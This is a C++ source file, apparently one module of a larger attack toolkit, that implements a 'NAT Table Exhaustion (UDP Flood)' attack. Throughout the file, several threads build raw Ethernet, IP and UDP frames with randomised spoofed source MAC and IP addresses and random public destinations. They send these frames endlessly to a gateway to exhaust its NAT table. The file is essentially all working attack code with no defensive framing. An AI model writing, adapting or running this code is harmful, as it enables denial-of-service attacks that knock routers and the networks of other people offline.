#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <random>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <cstring>
#include <chrono>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <net/ethernet.h> 
#include <net/if.h>
#include <linux/if_packet.h>


#include "../headers/nat.h"
#include "../headers/helperfuncs.h"


// Helper function to parse MAC address string
std::vector<uint8_t> parse_mac_address(const std::string& mac_str) {
    std::vector<uint8_t> mac_addr;
    std::stringstream ss(mac_str);
    std::string segment;

    while(std::getline(ss, segment, ':')) {
        mac_addr.push_back(std::stoul(segment, nullptr, 16));
    }
    return mac_addr;
}


// Standard Internet Checksum
unsigned short checksum(void* b, int len) {
    unsigned short *buf = (unsigned short*)b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}


NAT::NAT(AttackMode mode) : running(false), mode(mode) {
    srand(time(0));
}

NAT::~NAT() {
    stop();
}

std::string NAT::get_name() {
    return "NAT Table Exhaustion (UDP Flood)";
}

void NAT::stop() {
    if (running) {
        running = false;
        //std::cout << "\n[*] Halting NAT Exhaustion threads..." << std::endl;
        
        for (auto& t : attack_threads) {
            if (t.joinable()) t.join();
        }
        attack_threads.clear();
        //std::cout << "[+] Module Stopped." << std::endl;
    }
}

std::string NAT::generate_random_public_ip() {
    // Exclude private ranges. This is a simplified check.
    while (true) {
        int o1 = rand() % 223 + 1; // Avoid 0, 127, 224+
        int o2 = rand() % 256;
        int o3 = rand() % 256;
        int o4 = rand() % 254 + 1; // Avoid 0 and 255 for broadcast

        if (o1 == 10 || o1 == 127) continue;
        if (o1 == 172 && (o2 >= 16 && o2 <= 31)) continue;
        if (o1 == 192 && o2 == 168) continue;
        if (o1 >= 224) continue; // Multicast/Reserved

        return std::to_string(o1) + "." + std::to_string(o2) + "." + std::to_string(o3) + "." + std::to_string(o4);
    }
}

// Generates a random IP within the same /24 subnet as the given IP
std::string NAT::generate_random_local_ip(const std::string& local_ip) {
    if (local_ip.empty()) {
        // Fallback for safety, though run() should prevent this.
        return "192.168.1." + std::to_string(rand() % 254 + 1);
    }
    size_t last_dot = local_ip.rfind('.');
    std::string subnet = local_ip.substr(0, last_dot + 1);
    return subnet + std::to_string(rand() % 254 + 2); // Avoid .0, .1, .255
}


void NAT::run(Session* session) {
    if (running) {
        std::cout << "[-] NAT Exhaustion is already running." << std::endl;
        return;
    }

    if (session->interface.empty()) {
        std::cerr << "[-] Error: Interface not set in session." << std::endl;
        return;
    }

    if (session->gateway_ip.empty()) {
        std::cerr << "[-] Error: Gateway IP not set in session. Please set it in Target Configuration." << std::endl;
        return;
    }

    // Get gateway MAC address
    HelperFunctions hf;
    std::string gateway_mac_str = hf.get_mac_from_ip(session->gateway_ip);
    if (gateway_mac_str.empty() || gateway_mac_str == "00:00:00:00:00:00") {
        std::cerr << "[-] Error: Could not determine gateway MAC address. Make sure the gateway is in the ARP cache." << std::endl;
        return;
    }
    std::vector<uint8_t> gateway_mac = parse_mac_address(gateway_mac_str);


    int thread_count = 4; // Default thread count
    
    std::string local_ip = session->helper->get_local_ip(session->interface.c_str());
     if (local_ip.empty()) {
        std::cerr << "[-] Error: Could not determine local IP for interface " << session->interface << std::endl;
        return;
    }

    running = true;
    //std::cout << C_GREEN << "[+] Launching " << thread_count << " threads for NAT exhaustion via " << session->gateway_ip << C_RESET << std::endl;

    for (int i = 0; i < thread_count; i++) {
        attack_threads.emplace_back(&NAT::exhaust_loop, this, local_ip, session->interface, gateway_mac, i);
    }
}

void NAT::exhaust_loop(std::string local_ip, std::string interface_name, std::vector<uint8_t> gateway_mac, int thread_id) {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sock < 0) {
        perror("Socket creation failed (AF_PACKET)");
        return;
    }

    // --- Start of performance improvements ---

    // Set up a high-quality random number generator for this thread.
    std::random_device rd;
    std::mt19937 gen(rd() + thread_id);
    std::uniform_int_distribution<uint32_t> u32_dist;
    std::uniform_int_distribution<uint16_t> u16_dist;
    std::uniform_int_distribution<uint16_t> port_dist(1, 65535);
    std::uniform_int_distribution<uint8_t> host_dist(2, 254);

    // Pre-calculate the source subnet to avoid string operations in the loop.
    uint32_t src_net;
    struct in_addr addr;
    if (inet_aton(local_ip.c_str(), &addr) == 0) {
        src_net = (192 << 24) | (168 << 16) | (1 << 8); // Default to 192.168.1.0/24
    } else {
        src_net = ntohl(addr.s_addr) & 0xFFFFFF00; // Extract /24 network, host byte order
    }

    // --- End of performance improvements ---

    // Prepare packet buffer and headers
    const int packet_len = sizeof(struct ether_header) + sizeof(struct iphdr) + sizeof(struct udphdr);
    char packet[packet_len];
    struct ether_header *eth = (struct ether_header *)packet;
    struct iphdr *iph = (struct iphdr *)(packet + sizeof(struct ether_header));
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct ether_header) + sizeof(struct ip));
    
    // Prepare socket address for sending
    struct sockaddr_ll socket_address;
    socket_address.sll_ifindex = if_nametoindex(interface_name.c_str());
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, gateway_mac.data(), ETH_ALEN);


    while (running) {
        memset(packet, 0, packet_len);

        // --- L2 - Ethernet Header ---
        uint32_t rand_mac1 = u32_dist(gen);
        uint16_t rand_mac2 = u16_dist(gen);
        memcpy(eth->ether_shost, &rand_mac1, 4);
        memcpy(eth->ether_shost + 4, &rand_mac2, 2);
        memcpy(eth->ether_dhost, gateway_mac.data(), ETH_ALEN);
        eth->ether_type = htons(ETH_P_IP);


        // --- L3 - IP Header ---
        uint32_t spoofed_src_ip_int = src_net | host_dist(gen);

        uint32_t random_dest_ip_int;
        uint8_t o1, o2;
        do {
            random_dest_ip_int = u32_dist(gen);
            o1 = (random_dest_ip_int >> 24) & 0xFF;
            o2 = (random_dest_ip_int >> 16) & 0xFF;
        } while (o1 == 10 || o1 == 127 || (o1 == 172 && o2 >= 16 && o2 <= 31) || (o1 == 192 && o2 == 168) || o1 >= 224 || o1 == 0);


        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr));
        iph->id = htons(u16_dist(gen));
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0; 
        iph->saddr = htonl(spoofed_src_ip_int);
        iph->daddr = htonl(random_dest_ip_int);

        // --- L4 - UDP Header ---
        udph->source = port_dist(gen);
        udph->dest = htons(port_dist(gen));
        udph->len = htons(sizeof(struct udphdr));
        udph->check = 0; 

        // Calculate IP checksum
        iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

        if (sendto(sock, packet, packet_len, 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
            //perror("sendto failed");
        }
    }

    close(sock);
}

